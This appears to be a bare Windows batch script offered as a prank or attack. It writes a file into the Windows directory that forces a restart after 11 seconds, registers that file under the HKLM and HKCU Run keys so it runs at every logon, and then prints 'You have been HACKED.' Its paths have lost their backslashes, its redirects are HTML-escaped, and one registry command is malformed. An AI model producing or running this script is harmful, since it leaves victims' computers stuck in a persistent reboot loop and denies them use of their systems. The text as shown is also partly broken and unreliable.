echo @echo off&gt;c:windowshartlell.bat echo break off&gt;&gt;c:windowshartlell.bat echo shutdown -r -t 11 -f&gt;&gt;c:windowshartlell.bat echo end&gt;&gt;c:windowshartlell.bat reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f echo You have been HACKED. PAUSE